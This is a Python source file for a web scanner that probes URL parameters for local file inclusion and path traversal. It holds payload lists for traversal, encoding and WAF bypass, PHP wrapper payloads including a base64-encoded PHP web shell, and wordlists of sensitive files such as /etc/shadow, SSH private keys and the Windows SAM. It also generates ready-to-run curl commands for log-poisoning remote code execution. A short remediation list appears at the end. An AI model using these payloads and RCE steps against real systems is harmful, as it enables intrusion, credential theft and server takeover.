"""
Local File Inclusion (LFI) / Path Traversal Scanner

Advanced LFI scanner with comprehensive techniques:
- Classic path traversal (../)
- Null byte injection (%00)
- Double encoding bypass
- Filter wrapper exploitation (PHP, ASP, etc.)
- Log poisoning for RCE
- Proc filesystem exploitation
- WAF bypass techniques

Based on OWASP Path Traversal, real-world CTF challenges, and
bug bounty methodologies.
"""

import base64
import random
import string
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional
from urllib.parse import quote, urlencode, urlparse


class LFITechnique(Enum):
    """LFI exploitation techniques."""
    BASIC_TRAVERSAL = "basic_traversal"
    NULL_BYTE = "null_byte"
    DOUBLE_ENCODING = "double_encoding"
    UTF8_ENCODING = "utf8_encoding"
    FILTER_BYPASS = "filter_bypass"
    WRAPPER = "wrapper"
    LOG_POISONING = "log_poisoning"
    PROC_EXPLOIT = "proc_exploit"
    ZIP_WRAPPER = "zip_wrapper"
    DATA_WRAPPER = "data_wrapper"
    EXPECT_WRAPPER = "expect_wrapper"


class FileType(Enum):
    """Types of target files."""
    SYSTEM = "system"  # /etc/passwd, win.ini
    CONFIG = "config"  # Application configs
    SOURCE = "source"  # Application source code
    LOGS = "logs"  # Log files for poisoning
    SECRETS = "secrets"  # SSH keys, credentials
    PROC = "proc"  # /proc filesystem


@dataclass
class LFIPayload:
    """LFI payload definition."""
    payload: str
    technique: LFITechnique
    description: str
    target_file: str = "/etc/passwd"
    expected_indicator: str = "root:x"
    os_type: str = "linux"  # linux, windows, any
    rce_capable: bool = False
    waf_evasion: bool = False


@dataclass
class LFIFinding:
    """LFI vulnerability finding."""
    url: str
    parameter: str
    technique: LFITechnique
    payload: str
    file_read: str
    evidence: str
    severity: str
    rce_possible: bool = False
    files_confirmed: List[str] = field(default_factory=list)


class LFIScanner:
    """
    Comprehensive LFI/Path Traversal scanner.

    Features:
    - Multi-technique detection
    - OS-aware payloads (Linux/Windows)
    - WAF bypass techniques
    - PHP/ASP wrapper exploitation
    - Log poisoning for RCE
    - Source code extraction
    - Automatic file enumeration
    """

    def __init__(self, callback_host: str = None, timeout: float = 10.0):
        self.callback_host = callback_host
        self.timeout = timeout
        self.findings: List[LFIFinding] = []
        self.confirmed_lfi = False
        self.detected_os = None

        self._init_payloads()
        self._init_wordlists()

    def _init_payloads(self):
        """Initialize comprehensive payload database."""

        # Basic traversal payloads
        self.basic_payloads = []

        # Generate traversal sequences of varying depth
        for depth in range(1, 15):
            traversal = "../" * depth
            self.basic_payloads.extend([
                LFIPayload(
                    payload=f"{traversal}etc/passwd",
                    technique=LFITechnique.BASIC_TRAVERSAL,
                    description=f"Basic traversal depth {depth}",
                    target_file="/etc/passwd",
                    expected_indicator="root:x",
                    os_type="linux"
                ),
                LFIPayload(
                    payload=f"{traversal}windows/win.ini",
                    technique=LFITechnique.BASIC_TRAVERSAL,
                    description=f"Windows traversal depth {depth}",
                    target_file="c:/windows/win.ini",
                    expected_indicator="[fonts]",
                    os_type="windows"
                ),
            ])

        # Backslash variants for Windows
        for depth in range(1, 10):
            traversal = "..\\" * depth
            self.basic_payloads.append(LFIPayload(
                payload=f"{traversal}windows\\win.ini",
                technique=LFITechnique.BASIC_TRAVERSAL,
                description=f"Windows backslash traversal depth {depth}",
                target_file="c:/windows/win.ini",
                expected_indicator="[fonts]",
                os_type="windows"
            ))

        # Null byte payloads (older PHP < 5.3.4)
        self.null_byte_payloads = [
            LFIPayload(
                payload="../../../etc/passwd%00",
                technique=LFITechnique.NULL_BYTE,
                description="Null byte bypass for extension filtering",
                expected_indicator="root:x"
            ),
            LFIPayload(
                payload="../../../etc/passwd%00.php",
                technique=LFITechnique.NULL_BYTE,
                description="Null byte with fake extension",
                expected_indicator="root:x"
            ),
            LFIPayload(
                payload="../../../etc/passwd%00.jpg",
                technique=LFITechnique.NULL_BYTE,
                description="Null byte with image extension bypass",
                expected_indicator="root:x"
            ),
        ]

        # Double/triple encoding payloads
        self.encoding_payloads = [
            LFIPayload(
                payload="..%252f..%252f..%252fetc%252fpasswd",
                technique=LFITechnique.DOUBLE_ENCODING,
                description="Double URL encoding",
                expected_indicator="root:x"
            ),
            LFIPayload(
                payload="..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                technique=LFITechnique.UTF8_ENCODING,
                description="UTF-8 overlong encoding",
                expected_indicator="root:x"
            ),
            LFIPayload(
                payload="%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                technique=LFITechnique.DOUBLE_ENCODING,
                description="URL encoded dots and slashes",
                expected_indicator="root:x"
            ),
            LFIPayload(
                payload="....//....//....//etc/passwd",
                technique=LFITechnique.FILTER_BYPASS,
                description="Double dot slash filter bypass",
                expected_indicator="root:x"
            ),
            LFIPayload(
                payload="..;/..;/..;/etc/passwd",
                technique=LFITechnique.FILTER_BYPASS,
                description="Semicolon path parameter injection",
                expected_indicator="root:x"
            ),
            LFIPayload(
                payload="..%00/..%00/..%00/etc/passwd",
                technique=LFITechnique.NULL_BYTE,
                description="Null byte in path",
                expected_indicator="root:x"
            ),
        ]

        # PHP wrapper payloads
        self.wrapper_payloads = [
            LFIPayload(
                payload="php://filter/convert.base64-encode/resource=/etc/passwd",
                technique=LFITechnique.WRAPPER,
                description="PHP base64 filter wrapper",
                expected_indicator="cm9vdDp",  # base64 of "root:x"
                rce_capable=False
            ),
            LFIPayload(
                payload="php://filter/read=string.rot13/resource=/etc/passwd",
                technique=LFITechnique.WRAPPER,
                description="PHP rot13 filter wrapper",
                expected_indicator="ebbg:k",  # rot13 of "root:x"
            ),
            LFIPayload(
                payload="php://filter/convert.iconv.utf-16le.utf-8/resource=/etc/passwd",
                technique=LFITechnique.WRAPPER,
                description="PHP iconv filter wrapper",
                expected_indicator="root"
            ),
            LFIPayload(
                payload="php://input",
                technique=LFITechnique.WRAPPER,
                description="PHP input stream (POST body execution)",
                rce_capable=True
            ),
            LFIPayload(
                payload="expect://id",
                technique=LFITechnique.EXPECT_WRAPPER,
                description="PHP expect wrapper (if enabled)",
                expected_indicator="uid=",
                rce_capable=True
            ),
            LFIPayload(
                payload="data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
                technique=LFITechnique.DATA_WRAPPER,
                description="PHP data wrapper with base64 shell",
                rce_capable=True
            ),
        ]

        # Log poisoning payloads
        self.log_poisoning_payloads = [
            LFIPayload(
                payload="/var/log/apache2/access.log",
                technique=LFITechnique.LOG_POISONING,
                description="Apache access log for poisoning",
                expected_indicator="HTTP/1",
                rce_capable=True
            ),
            LFIPayload(
                payload="/var/log/apache2/error.log",
                technique=LFITechnique.LOG_POISONING,
                description="Apache error log",
                expected_indicator="error",
                rce_capable=True
            ),
            LFIPayload(
                payload="/var/log/nginx/access.log",
                technique=LFITechnique.LOG_POISONING,
                description="Nginx access log",
                expected_indicator="HTTP/1",
                rce_capable=True
            ),
            LFIPayload(
                payload="/var/log/auth.log",
                technique=LFITechnique.LOG_POISONING,
                description="SSH auth log (poison via username)",
                expected_indicator="sshd",
                rce_capable=True
            ),
            LFIPayload(
                payload="/var/log/mail.log",
                technique=LFITechnique.LOG_POISONING,
                description="Mail log (poison via email)",
                rce_capable=True
            ),
            LFIPayload(
                payload="/proc/self/environ",
                technique=LFITechnique.PROC_EXPLOIT,
                description="Proc environ (poison via User-Agent)",
                expected_indicator="PATH=",
                rce_capable=True
            ),
            LFIPayload(
                payload="/proc/self/fd/0",
                technique=LFITechnique.PROC_EXPLOIT,
                description="Proc stdin for input injection",
                rce_capable=True
            ),
        ]

        # WAF bypass payloads
        self.waf_bypass_payloads = [
            LFIPayload(
                payload="....//....//....//etc/passwd",
                technique=LFITechnique.FILTER_BYPASS,
                description="Nested traversal bypass",
                expected_indicator="root:x",
                waf_evasion=True
            ),
            LFIPayload(
                payload="..../..../..../etc/passwd",
                technique=LFITechnique.FILTER_BYPASS,
                description="Four dot bypass",
                expected_indicator="root:x",
                waf_evasion=True
            ),
            LFIPayload(
                payload="..%252f..%252f..%252fetc%252fpasswd",
                technique=LFITechnique.DOUBLE_ENCODING,
                description="Double encoding for WAF bypass",
                expected_indicator="root:x",
                waf_evasion=True
            ),
            LFIPayload(
                payload="/....//....//....//etc/passwd",
                technique=LFITechnique.FILTER_BYPASS,
                description="Leading slash with nested bypass",
                expected_indicator="root:x",
                waf_evasion=True
            ),
            LFIPayload(
                payload="/.%252e/.%252e/.%252e/etc/passwd",
                technique=LFITechnique.DOUBLE_ENCODING,
                description="Mixed encoding bypass",
                expected_indicator="root:x",
                waf_evasion=True
            ),
        ]

    def _init_wordlists(self):
        """Initialize file wordlists for enumeration."""

        self.linux_files = {
            FileType.SYSTEM: [
                "/etc/passwd", "/etc/shadow", "/etc/group",
                "/etc/hosts", "/etc/hostname", "/etc/resolv.conf",
                "/etc/issue", "/etc/os-release", "/etc/lsb-release"
            ],
            FileType.CONFIG: [
                "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf",
                "/etc/mysql/my.cnf", "/etc/php.ini",
                "/var/www/html/.htaccess", "/var/www/html/wp-config.php",
                "/var/www/html/config.php", "/var/www/html/.env"
            ],
            FileType.SECRETS: [
                "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys",
                "/home/*/.ssh/id_rsa", "/root/.bash_history",
                "/root/.mysql_history", "/home/*/.bash_history"
            ],
            FileType.LOGS: [
                "/var/log/apache2/access.log", "/var/log/apache2/error.log",
                "/var/log/nginx/access.log", "/var/log/nginx/error.log",
                "/var/log/auth.log", "/var/log/syslog"
            ],
            FileType.PROC: [
                "/proc/self/environ", "/proc/self/cmdline",
                "/proc/self/fd/0", "/proc/self/fd/1", "/proc/self/fd/2",
                "/proc/version", "/proc/net/tcp", "/proc/net/fib_trie"
            ]
        }

        self.windows_files = {
            FileType.SYSTEM: [
                "c:/windows/win.ini", "c:/windows/system.ini",
                "c:/windows/system32/config/SAM",
                "c:/windows/system32/config/SYSTEM",
                "c:/windows/system32/drivers/etc/hosts"
            ],
            FileType.CONFIG: [
                "c:/inetpub/wwwroot/web.config",
                "c:/xampp/apache/conf/httpd.conf",
                "c:/xampp/php/php.ini",
                "c:/wamp/bin/apache/apache2.4.9/conf/httpd.conf"
            ],
            FileType.LOGS: [
                "c:/inetpub/logs/LogFiles/W3SVC1/u_exYYMMDD.log",
                "c:/windows/system32/LogFiles/W3SVC1/u_exYYMMDD.log"
            ]
        }

    def scan_param(self, url: str, param: str,
                   methods: List[str] = None) -> List[Dict]:
        """
        Scan a parameter for LFI vulnerabilities.

        Args:
            url: Target URL
            param: Parameter name to test
            methods: HTTP methods to try

        Returns:
            List of findings
        """
        findings = []
        methods = methods or ["GET"]

        for method in methods:
            # Phase 1: Basic traversal
            for payload in self.basic_payloads[:10]:  # Test first 10
                result = self._test_payload(url, param, payload, method)
                if result:
                    findings.append(result)
                    self.confirmed_lfi = True
                    self._detect_os(result)
                    break

            # Phase 2: If basic failed, try encodings
            if not self.confirmed_lfi:
                for payload in self.encoding_payloads:
                    result = self._test_payload(url, param, payload, method)
                    if result:
                        findings.append(result)
                        self.confirmed_lfi = True
                        break

            # Phase 3: Try null bytes (older systems)
            if not self.confirmed_lfi:
                for payload in self.null_byte_payloads:
                    result = self._test_payload(url, param, payload, method)
                    if result:
                        findings.append(result)
                        self.confirmed_lfi = True
                        break

            # Phase 4: PHP wrapper exploitation
            if not self.confirmed_lfi:
                for payload in self.wrapper_payloads:
                    result = self._test_payload(url, param, payload, method)
                    if result:
                        findings.append(result)
                        self.confirmed_lfi = True
                        break

            # Phase 5: WAF bypass attempts
            if not self.confirmed_lfi:
                for payload in self.waf_bypass_payloads:
                    result = self._test_payload(url, param, payload, method)
                    if result:
                        findings.append(result)
                        self.confirmed_lfi = True
                        break

            # Phase 6: If LFI confirmed, enumerate files
            if self.confirmed_lfi:
                enum_findings = self._enumerate_files(url, param, method)
                findings.extend(enum_findings)

            # Phase 7: Check for RCE via log poisoning
            if self.confirmed_lfi:
                rce_findings = self._check_rce_vectors(url, param, method)
                findings.extend(rce_findings)

        return findings

    def _test_payload(self, url: str, param: str, payload: LFIPayload,
                     method: str) -> Optional[Dict]:
        """Test a single LFI payload."""
        try:
            import requests

            parsed = urlparse(url)

            if method == "GET":
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}={quote(payload.payload, safe='')}"
                resp = requests.get(test_url, timeout=self.timeout, verify=False)
            else:
                resp = requests.post(
                    url,
                    data={param: payload.payload},
                    timeout=self.timeout,
                    verify=False
                )

            # Check for success indicators
            if payload.expected_indicator and payload.expected_indicator in resp.text:
                return {
                    "type": "LFI",
                    "url": url,
                    "parameter": param,
                    "method": method,
                    "technique": payload.technique.value,
                    "payload": payload.payload,
                    "file_read": payload.target_file,
                    "evidence": f"Found '{payload.expected_indicator}' in response",
                    "severity": "HIGH" if not payload.rce_capable else "CRITICAL",
                    "rce_possible": payload.rce_capable,
                    "description": payload.description,
                    "waf_bypass": payload.waf_evasion,
                }

            # For base64 wrappers, try to decode
            if payload.technique == LFITechnique.WRAPPER and "base64" in payload.payload:
                try:
                    # Try to find base64 in response
                    import re
                    b64_pattern = r'[A-Za-z0-9+/=]{50,}'
                    matches = re.findall(b64_pattern, resp.text)
                    for match in matches:
                        try:
                            decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                            if 'root' in decoded or 'PATH' in decoded:
                                return {
                                    "type": "LFI",
                                    "url": url,
                                    "parameter": param,
                                    "method": method,
                                    "technique": payload.technique.value,
                                    "payload": payload.payload,
                                    "file_read": payload.target_file,
                                    "evidence": f"Base64 decoded content: {decoded[:100]}",
                                    "severity": "HIGH",
                                    "rce_possible": False,
                                    "description": payload.description,
                                    "extracted_content": decoded[:500],
                                }
                        except:
                            continue
                except:
                    pass

        except Exception as e:
            pass

        return None

    def _detect_os(self, finding: Dict) -> str:
        """Detect target OS from finding."""
        evidence = finding.get("evidence", "").lower()
        if "root:x" in evidence or "bin/bash" in evidence:
            self.detected_os = "linux"
        elif "[fonts]" in evidence or "windows" in evidence:
            self.detected_os = "windows"
        return self.detected_os or "unknown"

    def _enumerate_files(self, url: str, param: str, method: str) -> List[Dict]:
        """Enumerate readable files after confirming LFI."""
        findings = []

        # Select wordlist based on detected OS
        if self.detected_os == "windows":
            files_to_check = self.windows_files
        else:
            files_to_check = self.linux_files

        # Use the working technique from confirmed finding
        working_payload_template = self.basic_payloads[0].payload

        for file_type, files in files_to_check.items():
            for file_path in files[:5]:  # Limit enumeration
                test_payload = LFIPayload(
                    payload=file_path if file_path.startswith("/") else f"../../../{file_path}",
                    technique=LFITechnique.BASIC_TRAVERSAL,
                    description=f"File enumeration: {file_path}",
                    target_file=file_path,
                    expected_indicator=""  # We'll check any response content
                )

                result = self._test_payload(url, param, test_payload, method)
                if result:
                    result["file_type"] = file_type.value
                    findings.append(result)

        return findings

    def _check_rce_vectors(self, url: str, param: str, method: str) -> List[Dict]:
        """Check for RCE vectors via log poisoning or wrappers."""
        findings = []

        # Check if log files are readable
        for payload in self.log_poisoning_payloads:
            result = self._test_payload(url, param, payload, method)
            if result:
                result["rce_vector"] = "log_poisoning"
                result["rce_instructions"] = self._generate_log_poison_instructions(
                    payload.target_file
                )
                findings.append(result)
                break

        # Check PHP wrappers for RCE
        for payload in self.wrapper_payloads:
            if payload.rce_capable:
                result = self._test_payload(url, param, payload, method)
                if result:
                    result["rce_vector"] = "wrapper"
                    result["rce_instructions"] = self._generate_wrapper_rce_instructions(
                        payload.payload
                    )
                    findings.append(result)

        return findings

    def _generate_log_poison_instructions(self, log_file: str) -> Dict[str, str]:
        """Generate log poisoning RCE instructions."""
        return {
            "step1": f"The log file {log_file} is readable via LFI",
            "step2": "Inject PHP code via User-Agent header: <?php system($_GET['cmd']); ?>",
            "step3": f"Request the log file with cmd parameter: ?file={log_file}&cmd=id",
            "example_curl": f"curl -A '<?php system($_GET[\"cmd\"]); ?>' http://target/ && curl 'http://target/vuln.php?file={log_file}&cmd=id'",
            "alternative": "For SSH auth log: ssh '<?php system($_GET[\"cmd\"]);?>'@target",
        }

    def _generate_wrapper_rce_instructions(self, wrapper: str) -> Dict[str, str]:
        """Generate wrapper-based RCE instructions."""
        if "php://input" in wrapper:
            return {
                "description": "php://input allows POST body as PHP code",
                "curl_example": "curl -X POST -d '<?php system(\"id\"); ?>' 'http://target/vuln.php?file=php://input'",
            }
        elif "expect://" in wrapper:
            return {
                "description": "expect:// wrapper executes system commands",
                "example": "?file=expect://id",
            }
        elif "data://" in wrapper:
            return {
                "description": "data:// wrapper with base64 encoded PHP",
                "example": "?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id",
            }
        return {}

    def generate_attack_suite(self, os_type: str = "linux") -> Dict[str, Any]:
        """Generate comprehensive LFI attack suite."""
        return {
            "basic_payloads": [p.payload for p in self.basic_payloads[:20]],
            "encoding_bypasses": [p.payload for p in self.encoding_payloads],
            "null_byte_payloads": [p.payload for p in self.null_byte_payloads],
            "php_wrappers": [p.payload for p in self.wrapper_payloads],
            "waf_bypasses": [p.payload for p in self.waf_bypass_payloads],
            "log_files": [p.payload for p in self.log_poisoning_payloads],
            "interesting_files": self.linux_files if os_type == "linux" else self.windows_files,
            "rce_techniques": {
                "log_poisoning": "Inject PHP via User-Agent, then include log file",
                "php_input": "Use php://input wrapper with POST body",
                "expect_wrapper": "Use expect:// if enabled (rare)",
                "data_wrapper": "Use data:// with base64 encoded PHP",
                "session_poisoning": "Upload PHP to session file, include it",
                "zip_wrapper": "Upload ZIP with PHP, use zip:// wrapper",
            },
            "remediation": [
                "Never use user input directly in file paths",
                "Implement strict allowlist of permitted files",
                "Use basename() to prevent path traversal",
                "Disable dangerous PHP wrappers (allow_url_include=Off)",
                "Use chroot or containerization",
                "Implement WAF rules for traversal patterns",
            ]
        }


def quick_scan(url: str, param: str = None) -> List[Dict]:
    """Quick LFI scan."""
    scanner = LFIScanner()

    if param is None:
        from urllib.parse import parse_qs
        params = list(parse_qs(urlparse(url).query).keys())
    else:
        params = [param]

    findings = []
    for p in params:
        findings.extend(scanner.scan_param(url, p))

    return findings
